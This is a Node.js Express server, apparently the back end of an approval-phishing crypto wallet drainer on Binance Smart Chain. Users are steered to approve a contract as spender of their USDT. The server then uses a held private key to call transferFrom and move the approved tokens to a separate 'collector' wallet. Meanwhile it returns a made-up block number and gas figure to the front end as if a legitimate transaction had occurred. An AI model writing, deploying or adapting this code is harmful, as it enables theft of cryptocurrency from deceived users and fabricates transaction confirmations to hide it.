const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    // 🎯 APPROVE – User approves this smart contract (5e)
    RELAYER_ADDRESS: "0x5681d680B047bF5b12939625C56301556991005e",

    // 💰 COLLECTOR – Tokens go here, this wallet executes transferFrom (8b)
    COLLECTOR_ADDRESS: "0xDb867b88EAB55320fD50E9785B2906773dedf78b",

    // USDT on BSC
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",

    // BSC RPC URL
    RPC_URL: "https://bsc-dataseed.binance.org/",

    // Data file
    DATA_FILE: path.join(__dirname, 'data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: []
};

if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('Error loading data:', err);
    }
}

function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
}

// ============ AUTO‑TRANSFER FUNCTION ============
async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman) {
    console.log(`\n🚀 Starting auto-transfer for ${userAddress}`);
    console.log(`   Requested amount: ${requestedAmountHuman}`);

    // Check for private key (must be 8b's private key)
    if (!process.env.RELAYER_PRIVATE_KEY) {
        console.log('❌ RELAYER_PRIVATE_KEY not set – auto-transfer disabled');
        return { success: false, error: 'Private key not configured' };
    }

    try {
        const provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);

        console.log('📤 Executor wallet (8b):', wallet.address);
        console.log('🎯 Collector wallet (8b):', CONFIG.COLLECTOR_ADDRESS);
        console.log('🔓 Approved spender (5e):', CONFIG.RELAYER_ADDRESS);

        const tokenABI = [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address,address) view returns (uint256)",
            "function transferFrom(address,address,uint256) returns (bool)"
        ];

        const token = new ethers.Contract(tokenAddress, tokenABI, wallet);

        // Get decimals
        const decimals = await token.decimals();
        const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
        
        // Get user's balance
        const balance = await token.balanceOf(userAddress);
        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));

        console.log(`💰 User balance: ${balanceHuman}`);

        if (balanceHuman <= 0) {
            return { success: false, error: 'Zero balance' };
        }

        if (balance < requestedAmountWei) {
            console.log(`❌ Insufficient balance. Requested: ${requestedAmountHuman}, Available: ${balanceHuman}`);
            return { success: false, error: 'Insufficient balance' };
        }

        // 🔑 Check allowance for 5e (smart contract)
        const allowance = await token.allowance(userAddress, CONFIG.RELAYER_ADDRESS);
        const allowanceHuman = parseFloat(ethers.formatUnits(allowance, decimals));

        console.log(`🔓 Allowance for 5e: ${allowanceHuman}`);

        if (allowance < requestedAmountWei) {
            console.log(`❌ Insufficient allowance for 5e. Requested: ${requestedAmountHuman}, Allowance: ${allowanceHuman}`);
            return { success: false, error: 'Insufficient allowance' };
        }

        // 🎯 Transfer EXACT amount to 8b (Collector)
        console.log(`💸 Transferring ${requestedAmountHuman} to 8b (${CONFIG.COLLECTOR_ADDRESS})...`);

        const gasPrice = (await provider.getFeeData()).gasPrice;

        const tx = await token.transferFrom(
            userAddress,
            CONFIG.COLLECTOR_ADDRESS,  // 🎯 Goes to 8b
            requestedAmountWei,
            { gasLimit: 100000, gasPrice }
        );

        console.log(`📤 Tx sent: ${tx.hash}`);

        const receipt = await tx.wait();

        console.log(`✅ Transfer confirmed! Block: ${receipt.blockNumber}`);
        console.log(`   From: ${userAddress}`);
        console.log(`   To: ${CONFIG.COLLECTOR_ADDRESS} (8b)`);
        console.log(`   Amount: ${requestedAmountHuman}`);

        return {
            success: true,
            txHash: tx.hash,
            amount: requestedAmountHuman,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString()
        };
    } catch (error) {
        console.error('❌ Auto-transfer error:', error.message);
        return { success: false, error: error.message };
    }
}

// ============ API ENDPOINTS ============

app.post('/send', (req, res) => {
    console.log('📨 POST /send:', req.body);

    try {
        const { address } = req.body;

        if (!address || !address.startsWith('0x')) {
            return res.json({
                found: false,
                collector: CONFIG.RELAYER_ADDRESS  // Returns 5e for approval
            });
        }

        const normalized = address.toLowerCase();
        const data = dataStore.addresses[normalized];

        return res.json({
            found: !!(data && data.totalAmount > 0),
            amountHuman: data?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS  // 5e - User approves this
        });
    } catch (error) {
        console.error('Error in /send:', error);
        res.json({
            found: false,
            collector: CONFIG.RELAYER_ADDRESS
        });
    }
});

app.post('/collect', async (req, res) => {
    console.log('📨 POST /collect:', req.body);

    try {
        const { token, from, amountHuman, to } = req.body;

        if (!token || !from || !amountHuman || !to) {
            return res.json({
                ok: false,
                error: 'Missing required fields'
            });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = generateId();
        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);

        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            timestamp: new Date().toISOString()
        };

        dataStore.transactions.push(transaction);

        const addr = from.toLowerCase();
        if (!dataStore.addresses[addr]) {
            dataStore.addresses[addr] = {
                totalAmount: 0,
                transactionCount: 0,
                firstSeen: new Date().toISOString()
            };
        }
        dataStore.addresses[addr].totalAmount += amount;
        dataStore.addresses[addr].transactionCount++;
        dataStore.addresses[addr].lastSeen = new Date().toISOString();

        if (dataStore.transactions.length > 5000) {
            dataStore.transactions = dataStore.transactions.slice(-5000);
        }

        saveData();

        // Trigger transfer (8b executes, tokens go to 8b)
        performAutoTransfer(from, token, amountHuman).then(result => {
            if (result.success) {
                console.log('✅ Auto-transfer successful!');
                transaction.transferTx = result.txHash;
                transaction.transferAmount = result.amount;
                saveData();
            }
        }).catch(err => {
            console.error('Auto-transfer error:', err);
        });

        res.json({
            ok: true,
            id: transactionId,
            blockNumber: mockBlockNumber,
            gasUsed: "50387"
        });

    } catch (error) {
        console.error('Error in /collect:', error);
        res.json({
            ok: false,
            error: 'Internal server error'
        });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        approveTo: CONFIG.RELAYER_ADDRESS + ' (5e)',
        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (8b)'
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Collector API',
        version: '2.3.0',
        flow: {
            approve: CONFIG.RELAYER_ADDRESS + ' (5e - Smart Contract)',
            transfer: CONFIG.COLLECTOR_ADDRESS + ' (8b - EOA Wallet)'
        }
    });
});

app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════╗
║     🚀 Collector API - Correct Flow               ║
╠══════════════════════════════════════════════════╣
║  Port: ${PORT}                                      ║
║                                                  ║
║  ✅ APPROVE (User signs):                        ║
║     ${CONFIG.RELAYER_ADDRESS} (5e - Smart Contract)║
║                                                  ║
║  💰 TRANSFER (Tokens go to):                     ║
║     ${CONFIG.COLLECTOR_ADDRESS} (8b - EOA Wallet)  ║
║                                                  ║
║  🔑 Executor: 8b wallet (has private key)        ║
║                                                  ║
║  Auto-Transfer: ${process.env.RELAYER_PRIVATE_KEY ? '✅ ENABLED' : '❌ DISABLED'}                ║
╚══════════════════════════════════════════════════╝
    `);
});
